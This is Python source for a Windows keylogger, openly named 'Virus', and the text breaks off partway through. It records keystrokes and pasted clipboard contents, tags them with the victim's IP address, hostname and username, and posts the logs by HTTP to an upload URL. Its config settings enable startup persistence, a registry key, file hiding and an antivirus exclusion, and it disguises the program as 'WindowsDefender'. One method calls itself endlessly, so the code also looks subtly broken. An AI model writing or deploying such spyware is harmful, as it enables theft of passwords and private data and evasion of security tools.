import ctypes.wintypes
import subprocess
import threading
import winreg
import ctypes
import sys
import os

from pynput.keyboard import Listener, KeyCode, Key
from datetime import datetime
from queue import Queue
import pyperclip
import requests
import socket
import string
import uuid
import time

kernel32 = ctypes.WinDLL("kernel32")
user32 = ctypes.WinDLL("user32")
ntdll = ctypes.WinDLL("ntdll")
psapi = ctypes.WinDLL("psapi")

# Your virus functionalities here
class Virus(object):
    UPLOAD_URL = ""
    MAX_LAST_PRESS = 5
    MAX_TEXTS = 1500
    SESSION_ID = uuid.uuid4()

    cool_texts = string.printable.strip()
    last_press = time.time()
    texts = []
    upload_queue = Queue()

    def __init__(self):
        self._run()

    def _run(self):
        self._run()

        while True:
            try:
                listener = Listener(on_press=self.on_press)
                listener.start()
                listener.join()
            except Exception:
                time.sleep(1)
                continue
    
    def init_components(self):
        threading.Thread(target=self._last_press_listener, daemon=True).start()
        threading.Thread(target=self._upload_queue_handler, daemon=True).start()
    
    def _last_press_listener(self):
        while True:
            time.sleep(1)
            if not self.texts: continue
            if not (time.time() - self.last_press) > self.MAX_LAST_PRESS: continue
            threading.Thread(target=self._upload_logs, daemon=True).start()

    def _upload_queue_handler(self):
        while True:
            textstr = self.upload_queue.get()

            while True:
                try:
                    ip_address = requests.get("https://api.ipify.org/").text
                    break
                except Exception:
                    time.sleep(1)
                    continue
            
            loginfo = f"IP: {ip_address}\nHostname: {socket.gethostname()}\nUser: {os.environ.get('username')}\nOS Name: {os.name}\nLocal Time: {datetime.now()}\nSession ID: {self.SESSION_ID}\n\n"
            logtext = f"{loginfo}LOGS:\n{textstr}"

            filename = f"{uuid.uuid4()}.txt"
            while True:
                try:
                    http = requests.post(self.UPLOAD_URL, files={"file": (filename, logtext)})
                    if not http.status_code == 200: continue
                    break
                except Exception:
                    time.sleep(1)
                    continue

    def on_press(self, key: KeyCode):
        timenow = time.time()

        try:
            if type(key) == KeyCode:
                keystr = str(key.char)
                
                if not keystr in self.cool_texts:
                    keystr = f"\x00<^{chr(key.vk)}>\x00"

                self.append_text(keystr)

                if key.char.encode() == b"\x16":
                    self.append_text(f"\x00<^paste: {pyperclip.paste()}>\x00")

            elif type(key) == Key:
                if key.name == "space":
                    self.append_text(" ")
                    return
                elif key.name == "enter":
                    self.append_text("\x00<^enter>\x00\n")
                    return
                elif key.name == "backspace":
                    self.append_text("\x00<^backspace>\x00")
                    return
                
                keystr = f"\x00<^{key.name}>\x00"
                if len(self.texts) > 0:
                    if all([
                        self.texts[-1] == keystr,
                        key.name in ["shift", "ctrl_l", "ctrl_r", "shift", "shift_r", "alt_l", "alt_gr"],
                        (timenow - self.last_press) < 0.1
                    ]):
                        return

                self.append_text(keystr)

        finally:
            self.last_press = timenow
    
    def append_text(self, text):
        self.texts.append(text)

        if len("".join(self.texts)) >= self.MAX_TEXTS:
            threading.Thread(target=self._upload_logs, daemon=True).start()
    
    def _upload_logs(self):
        if not self.texts: return
        textstr = "".join(self.texts)
        self.upload_queue.put(textstr)
        self.texts.clear()


class VirusConfig:
    ADD_TO_STARTUP = True
    HIDE_FILE = True
    ADD_REG_KEY = True
    ADD_AV_EXCLUSION = True
    COPY_FILENAME = "WindowsDefender"
    RUN_ONLY_ONCE = True
    MUTEX_ID = "b6373edb-9b65-4b46-8840-49d3ad9a569b"


# -------------------- #

def add_to_startup():
    username = os.environ["username"]
    src = get_file_location()
    filename = os.path.split(src)[1]
    ext = filename.split(".")[-1]
    dst = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{VirusConfig.COPY_FILENAME}.{ext}"

    copy_file(src, dst)

def get_file_location():
    return os.getcwd() + "\\" + sys.argv[0]

def add_regkey():
